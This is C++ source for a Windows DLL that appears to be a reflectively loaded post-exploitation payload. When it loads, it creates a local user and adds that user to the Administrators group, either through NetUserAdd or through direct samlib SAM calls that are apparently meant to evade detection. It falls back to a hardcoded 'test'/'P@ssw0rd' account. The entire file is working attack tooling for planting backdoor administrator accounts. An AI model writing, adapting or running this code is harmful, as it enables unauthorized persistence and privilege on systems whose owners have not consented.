#include <windows.h>
#include <stdio.h>
#include <string>
#include "RLoader.h"
#include <lm.h>
#include "ApiAddUser.h"
#pragma comment(lib, "netapi32.lib")
#include <shellapi.h>
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "ntdll.lib")

#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

extern HINSTANCE hAppInstance;

std::string szargs;
std::wstring wszargs;
std::wstring wsHostFile;
int argc = 0;
LPWSTR* argv = NULL;



std::wstring StringToWString(const std::string& str)
{
	int num = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
	wchar_t* wide = new wchar_t[num];
	MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, wide, num);
	std::wstring w_str(wide);
	delete[] wide;
	return w_str;
}
void DLLRebuildNetUserAdd(LPWSTR username, LPWSTR password) {
	UNICODE_STRING UserName;
	UNICODE_STRING PassWord;

	HANDLE ServerHandle = NULL;
	HANDLE DomainHandle = NULL;
	HANDLE UserHandle = NULL;
	ULONG GrantedAccess;
	ULONG RelativeId;
	NTSTATUS Status = NULL;
	HMODULE hSamlib = NULL;
	HMODULE hNtdll = NULL;
	HMODULE hNetapi32 = NULL;
	LSA_HANDLE hPolicy = NULL;
	LSA_OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	PPOLICY_ACCOUNT_DOMAIN_INFO DomainInfo = NULL;
	USER_ALL_INFORMATION uai = { 0 };

	hSamlib = LoadLibraryA("samlib.dll");
	hNtdll = LoadLibraryA("ntdll");
	pSamConnect SamConnect = (pSamConnect)GetProcAddress(hSamlib, "SamConnect");
	pSamOpenDomain SamOpenDomain = (pSamOpenDomain)GetProcAddress(hSamlib, "SamOpenDomain");
	pSamCreateUser2InDomain SamCreateUser2InDomain = (pSamCreateUser2InDomain)GetProcAddress(hSamlib, "SamCreateUser2InDomain");
	pSamSetInformationUser SamSetInformationUser = (pSamSetInformationUser)GetProcAddress(hSamlib, "SamSetInformationUser");
	pSamQuerySecurityObject SamQuerySecurityObject = (pSamQuerySecurityObject)GetProcAddress(hSamlib, "SamQuerySecurityObject");
	pRtlInitUnicodeString RtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");

	RtlInitUnicodeString(&UserName, username);
	RtlInitUnicodeString(&PassWord, password);

	Status = SamConnect(NULL, &ServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_LOOKUP_DOMAIN, NULL);;
	Status = LsaOpenPolicy(NULL, &ObjectAttributes, POLICY_VIEW_LOCAL_INFORMATION, &hPolicy);
	Status = LsaQueryInformationPolicy(hPolicy, PolicyAccountDomainInformation, (PVOID*)&DomainInfo);

	Status = SamOpenDomain(ServerHandle,
		DOMAIN_CREATE_USER | DOMAIN_LOOKUP | DOMAIN_READ_PASSWORD_PARAMETERS,
		DomainInfo->DomainSid,
		&DomainHandle);

	Status = SamCreateUser2InDomain(DomainHandle,
		&UserName,
		USER_NORMAL_ACCOUNT,
		USER_ALL_ACCESS | DELETE | WRITE_DAC,
		&UserHandle, &GrantedAccess, &RelativeId);

	RtlInitUnicodeString(&uai.NtPassword, PassWord.Buffer);
	uai.NtPasswordPresent = TRUE;
	uai.WhichFields |= USER_ALL_NTPASSWORDPRESENT;


	Status = SamSetInformationUser(UserHandle,
		UserAllInformation,
		&uai);

	if (Status == NERR_Success) {
		//fprintf(stderr, "[+]User %s has been successfully added\n", username);
		wprintf(L"[+]Adding User:%ws Password: %ws\n", argv[1], argv[2]);
	}
	else {
		wprintf(L"[-]SelfBuild NetUserAdd Failed\n");
	}

	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = username;
	Status = NetLocalGroupAddMembers(
		NULL,
		L"Administrators",
		3,
		(LPBYTE)&account,
		1
	);
	if (Status == NERR_Success || Status == ERROR_MEMBER_IN_ALIAS) {
		wprintf(L"[+]Administrators added Successfully!\n");
	}
	else {
		wprintf(L"[-]Administrators added Failed!\n");
	}

	return;
}
void DLLNetUserAdd(LPWSTR username, LPWSTR password) {
	USER_INFO_1 ui;
	DWORD dwLevel = 1;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;
	ui.usri1_name = username;
	ui.usri1_password = password;
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_flags = UF_SCRIPT;
	nStatus = NetUserAdd(NULL,
		dwLevel,
		(LPBYTE)&ui,
		&dwError
	);

	if (nStatus == NERR_Success){
		fwprintf(stderr, L"User %s has been successfully added\n", argv[1]);
	}else {
		wprintf(L"[-]NetUserAdd Failed\n");
	}

	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = username;
	NET_API_STATUS Status = NetLocalGroupAddMembers(
		NULL,
		L"Administrators",
		3,
		(LPBYTE)&account,
		1
	);
	if (Status == NERR_Success || Status == ERROR_MEMBER_IN_ALIAS) {
		wprintf(L"[+]Administrators added Successfully!\n");
	}
	else {
		wprintf(L"[-]Administrators added Failed!\n");
	}
	fflush(stdout);

	return;
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		if (lpReserved != NULL) {
			szargs = (PCHAR)lpReserved;
			wszargs = StringToWString(szargs);
			argv = CommandLineToArgvW(wszargs.data(), &argc);
		}
		if (argv == NULL) {
			printf("[+]Adding User:test Password:P@ssw0rd \n");
			DLLNetUserAdd(L"test", L"P@ssw0rd");
		}
		else {

			LPWSTR index = argv[2];
			if (lstrcmpW(index, L"1") == 0) {
				DLLNetUserAdd(argv[0], argv[1]);
			}
			if(lstrcmpW(index, L"2") == 0){
				DLLRebuildNetUserAdd(argv[0], argv[1]);
			}

		}
		fflush(stdout);
		fflush(stderr);
		ExitProcess(0);
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
